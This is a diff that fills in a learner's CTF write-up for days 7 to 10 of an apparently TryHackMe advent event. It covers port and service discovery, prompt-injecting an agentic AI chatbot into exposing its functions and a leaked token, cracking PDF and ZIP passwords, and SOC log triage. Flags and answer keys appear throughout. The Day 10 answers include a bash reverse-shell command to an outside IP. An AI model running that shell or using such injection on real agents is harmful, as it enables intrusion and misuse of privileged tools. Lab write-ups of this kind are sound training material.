@@ -222,49 +222,75 @@ Malware analysis
 Day-7
 Network discovery
 
-# 1. 
-
+# 1. discover network services
 ## Solution:
+- we are given the target machine name and ip and first we shall scan for ports so we type nmap and the ip address of target so we can open ither by ssh or http
+- now we add the -p- argument to scann all ports and --script=banner to see whats behind the port. we log in with an anonymous name on the ftp server and get key 1
+- now we move to port 25251 using netcat command and type HELP and use GET key command and obtain the second key
+- now we switch to udp ports using nmap and ip and specifying -sU and now use the dig command which performs advance dns queries and obtain the 3rd key
+- now we login to the secret admin terminal and list the listening ports and we can see the services we scanned
+- 3306 port is for mysql database and upon running the command it shows one table with flag. Then we run an sql query which selects all of the data from the table and thats how we obtain the final flag
 
 ## Flag:
 ```
-
+- Pwned by HopSec
+- 3aster_
+- 15_th3_
+- n3w_xm45
+- 3306
+- THM{4ll_s3rvice5_d1sc0vered}
 ```
 
 
 Day-8
+Prompt injection
 
-# 1. 
-
+# 1. Agentic Ai hack
+- Large language models are the basis of many current AI systems. They are trained on massive collections of text and code, which allows them to produce human-like answers, summaries, and even generate programs or stories.
+- LLMs have restrictions that prevent them from going beyond their built-in abilities, which limits them. They cannot act outside their text box, and their training only lasts up to a certain point in time. Because of this, they may invent facts, miss recent events, or fail at tasks that require real-world actions.
 ## Solution:
-
+-  the 25th in the calender has been set to easter instead of christmas so first we tell the ai to change that and it gives a base 64 endcoded json output and then we click on the thinking which shows the breach or instructions which explains the funcion reset holiday so then li ask it to list the all available functions that are being used so we need reset holiday function.
+- we tell it to excute reset holiday and needs parameters. Now we run get logs function since we the need the token so a leaked token poped up and it might be the token. Now once we run it it tells us that in the backend the name is stored as sochmas so we change the name and type out the same prompt anf hence we get the edited webpage with 25th edited to christams
 ## Flag:
 ```
-
+- THM{XMAS_IS_COMING__BACK}
 ```
 
 
 Day-9
+Passwords
 
-# 1. 
-
+# 1. Attack against encrypted files
+- dictionary attack uses predefined set of list of potential passwords.
+- mask attacks or brute-force attack systematically tries every possible combination of characters until it finds the right one
 ## Solution:
-
+- first use file command and confirm the file format of the files on the desktop and accordingly pick tools
+- now we use pdfcrack tool which uses the pdf and wordlist to obtain the password the pdf file
+- for the zip file we use ```zip2john``` which extracts contents of the zip to another file which we name and then attach the wordlist so that we obtain the password of the zip file
 ## Flag:
 ```
-
+- THM{Cr4ck1ng_PDFs_1s_34$y}
+- THM{Cr4ck1n6_z1p$_1s_34$yyyy}
 ```
 
 
 Day-10
+Soc alert triaging
 
-# 1. 
-
+# 1. Investigation and logs
 ## Solution:
-
+- we first set up our enivironment and when an alert pops up we investigate which consists of multiple levels so we navigate to microsoft sentinel and based on the questiosn and answers required we individually investigate
+- first we investiagte superfically on top and obtain the first three answers and next we ive deeper in to logs and anylse queries and much more to obtain the rest of the answers
 ## Flag:
 ```
-
+- 10
+- High
+- 4
+- malicious_mod.ko
+- /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
+- 172.16.0.12
+- 203.0.113.45
+- deploy
 ```
 
 
